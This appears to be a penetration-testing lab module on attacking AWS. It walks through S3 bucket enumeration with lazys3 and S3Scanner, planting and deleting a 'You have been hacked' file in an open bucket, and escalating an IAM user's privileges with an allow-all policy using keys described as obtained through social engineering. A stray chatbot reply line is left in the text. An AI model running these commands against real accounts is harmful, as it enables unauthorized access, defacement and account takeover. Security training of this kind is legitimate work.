# Cloud Computing

## Introduction

- Cloud computing delivers various types of services and applications over the Internet. These services enable users to use software and hardware managed by third parties at remote locations. Some well-known cloud service providers are Google, Amazon, and Microsoft.

- Cloud computing is an emerging technology that delivers computing services such as online business applications, online data storage, and webmail over the Internet. Cloud implementation enables a distributed workforce, reduces organization expenses, provides data security, etc. As enterprises are increasingly adopting cloud services, cloud systems have emerged as targets for attackers to gain unauthorized access to the valuable data stored in them.

- Security administrators claim that cloud systems are more vulnerable to DOS assaults because they involve numerous individuals or clients, making DOS assaults potentially very harmful. Because of the high workload on a flooded service, these systems attempt to provide additional computational power (more virtual machines, more service instances) to cope with the workload, and they will eventually fail.

- Although cloud systems try to thwart attackers by providing additional computational power, they inadvertently aid attackers by allowing the most significant possible damage to the availability of a service—a process that starts from a single flooding-attack entry point. Thus, attackers need not flood all servers that provide a particular service but merely flood a single, cloud-based address to a service that is unavailable.

## Objective

- The objective is to perform cloud platform hacking and other tasks that include, but are not limited to:
    - Performing S3 bucket enumeration
    - Exploiting misconfigured S3 buckets
    - Escalating privileges of a target IAM user account by exploiting misconfigurations in a user policy

## Overview of Cloud Computing

- Cloud computing refers to on-demand delivery of IT capabilities, in which IT infrastructure and applications are provided to subscribers as metered services over a network. Cloud services are classified into three categories, namely infrastructure-as-a-service (IaaS), platform-as-a-service (PaaS), and software-as-a-service (SaaS), which offer different techniques for developing cloud.

## Tasks

Ethical hackers or pen testers use numerous tools and techniques to hack the target cloud platform. Recommended labs that will assist you in learning various cloud platform hacking techniques include:

#### 1. Perform S3 bucket enumeration using various S3 bucket enumeration tools
- Enumerate S3 bucket using lazys3
- Enumerate S3 bucket using S3Scanner
- Enumerate S3 bucket using Firefox extension

#### 2. Exploit S3 buckets
- Exploit S3 buckets using AWS CLI

#### 3. Perform Privilege escalation to gain Higher privileges
- Escalate IAM User Privileges by exploiting Misconfigured user policy

---
### 1. Perform S3 Bucket Enumeration using Various S3 Bucket Enumeration Tools

**Overview of Enumeration Tools:**

Enumeration tools are used to collect detailed information about target systems to exploit them. Information collected by S3 enumeration tools consists of a list of misconfigured S3 buckets that are available publicly. Attackers can exploit these buckets to gain unauthorized access to them. Moreover, they can modify, delete, and exfiltrate the bucket content.

#### Enumerate S3 Buckets using lazys3

- [lazys3](https://github.com/nahamsec/lazys3) is a Ruby script tool that is used to brute-force AWS S3 buckets using different permutations. This tool obtains the publicly accessible S3 buckets and also allows you to search the S3 buckets of a specific company by entering the company name.


- Run lazys3 to Find Public S3 Buckets
    ```bash
    ruby lazys3.rb
    ```
    - View the list of public S3 buckets.


- Search S3 Buckets of a Specific Company
    ```bash
    ruby lazys3.rb [Company]
    ```
    - Replace `[Company]` with the target company name (e.g., HackerOne).

#### Enumerate S3 Buckets using S3Scanner

- [S3Scanner](https://github.com/sa7mon/S3Scanner) is a tool that finds the open S3 buckets and dumps their contents. It takes a list of bucket names to check as its input. The S3 buckets that are found are output to a file. The tool also dumps or lists the contents of "open" buckets locally. Here, we will use the S3Scanner tool to enumerate open S3 buckets.


- Install dependencies:
   ```bash
   pip3 install -r requirements.txt
   ```

-  Run S3Scanner to Find Open S3 Buckets
```bash
python3 ./s3scanner.py sites.txt
```
- Replace `sites.txt` with the target website URL.

- Dump all open buckets, log both open and closed buckets:
  ```bash
  python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt
  ```

- Log open buckets in the default output file (buckets.txt):
  ```bash
  python3 ./s3scanner.py names.txt
  ```

- Save file listings of all open buckets to a file:
  ```bash
  python ./s3scanner.py --list names.txt
  ```

**Other S3 Bucket Enumeration Tools:**
- Additional tools:
  - [S31nspector](https://github.com)
  - [s3-buckets-bruteforcer](https://github.com)
  - [Mass3](https://github.com)
  - [Bucket Finder](https://digi.ninja)
  - [s3recon](https://github.com)

#### Enumerate S3 Buckets using S3BucketList Extension

[S3BucketList](https://addons.mozilla.org/en-US/firefox/addon/s3-bucketlist/) is a extension that records S3 buckets found in requests and lists them along with their permissions. Using this tool, we can determine whether an S3 bucket is public or private.

1. Visit [S3BucketList Firefox Extension](https://addons.mozilla.org/en-US/firefox/addon/s3-bucketlist/) page and add it to the browser.

2. Open a new browser tab, navigate to https://github.com.

3. Click the S3 Bucket List icon at the top-right of the browser window to view recorded S3 buckets.

4. Discovered S3 buckets are visible under the "S3 Bucket List" section.

5. To check permissions, select an S3 bucket.

6. For demonstration, a public S3 bucket can be used. The complete list of directories and files in the public S3 bucket is displayed.

7. Click the S3 Bucket List icon, expand the bucket to view permissions. Observe that it is public.

8. Public S3 buckets pose a security risk. Attackers can exploit misconfigured buckets.


### 2. Exploit S3 Buckets

**Service:** Simple Storage Service (S3) - Amazon Web Services (AWS)

- S3 buckets serve as a scalable cloud storage solution for storing various data types, including text documents, PDFs, videos, and images. Users create buckets with unique names to organize their data.

##### Techniques to Identify AWS S3 Buckets

---

| #   | Technique                   | Description                                                                                                     |
| --- | ----------------------------| ----------------------------------------------------------------------------------------------------------------- |
| 1   | Inspecting HTML             | Analyze HTML source code to find URLs leading to target S3 buckets.                                              |
| 2   | Brute-Forcing URL           | Use Burp Suite for a brute-force attack on the target bucket's URL to identify the correct URL.                   |
| 3   | Finding Subdomains          | Utilize tools like Findsubdomains and Robtex to identify subdomains related to the target bucket.                  |
| 4   | Reverse IP Search           | Leverage search engines like Bing for a reverse IP search to identify domains associated with the target buckets. |
| 5   | Advanced Google Hacking     | Employ advanced Google search operators such as "inurl" to discover URLs linked to the target S3 buckets.          |

---

#### Exploit open S3 Buckets using AWS CLI

- The AWS Command Line Interface (CLI) is a powerful tool for managing AWS services.

Certainly! Here's the reformatted content starting from 1:

1. Create an [AWS account](https://aws.amazon.com).

2. Install AWS CLI:
  ```bash
  pip3 install awscli
  ```

3. Verify the installation:
  ```bash
  aws --help
  ```

4. Configure AWS CLI:
  ```bash
  aws configure
  ```
  Provide the required details (Access Key ID, Secret Access Key, Default region name, and Default output format).

5. Login to your AWS account in the browser.

6. Create a new access key in the AWS Management Console.

7. Copy the Access Key ID and paste it into the terminal.

8. Copy the Secret Access Key and paste it into the terminal.

9. Set the Default region name to `eu-west-1`.

10. Confirm the Default output format.

11. List directories in the target S3 bucket:
  ```bash
  aws s3 ls s3://github
  ```

12. Move a file to the S3 bucket:
  ```bash
  echo "You have been hacked" >> Hack.txt
  aws s3 mv Hack.txt s3://github
  ```

13. Verify the file is moved by reloading the browser.

14. Delete the file from the S3 bucket:
  ```bash
  aws s3 rm s3://github/Hack.txt
  ```

15. Verify the file is deleted by reloading the browser.


### 3. Perform Privilege Escalation to Gain Higher Privileges

- Privilege escalation involves obtaining higher-level or administrator-level privileges for a target system using a non-administrator user account. Here, we are escalating privileges by leveraging an IAM user's access key and secret access key acquired through social engineering techniques. Common cloud platform vulnerabilities, including misconfigurations in access allocation systems, are exploited to achieve this.

- Privileges define security roles assigned to users, limiting their access to specific programs, features, or resources. Privilege escalation becomes necessary when unauthorized access to restricted system resources is sought. It occurs in two forms:

  - **Horizontal Privilege Escalation:** Unauthorized access attempts to resources and functions with similar permissions as an authorized user.
  - **Vertical Privilege Escalation:** Unauthorized users seek access to resources and functions with higher privileges, such as application or site administrators.


#### Escalate IAM User Privileges by Exploiting Misconfigured User Policy

1. Configure AWS CLI using `aws configure`. Enter the target IAM user's access key, secret access key, region (us-east-2), and output format (json).

**Policy Creation and Attachment:**

2. Create a user policy file using `vim user-policy.json`.

3. Enter the following script in the editor:
    ```json
    {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }
    ```

4. Attach the created policy to the target IAM user:
    ```bash
    aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
    ```

5. Note the details displayed, including PolicyName, PolicyId, and Arn.

6. Attach the policy to the target IAM user (replace `[Target Username]` with the actual username):
    ```bash
    aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
    ```

7. View the attached policies of the target user:
    ```bash
    aws iam list-attached-user-policies --user-name [Target Username]
    ```

**Verification and Exploration:**

8. Confirm the privilege escalation by listing all IAM users:
    ```bash
    aws iam list-users
    ```

9. Explore further AWS environment information using commands:
    - List S3 buckets:
        ```bash
        aws s3api list-buckets --query "Buckets[].Name"
        ```
    - List User Policies:
        ```bash
        aws iam list-user-policies
        ```
    - List Role Policies:
        ```bash
        aws iam list-role-policies
        ```
    - List Group Policies:
        ```bash
        aws iam list-group-policies
        ```
    - Create a new user:
        ```bash
        aws iam create-user --user-name [NewUsername]
        ```

---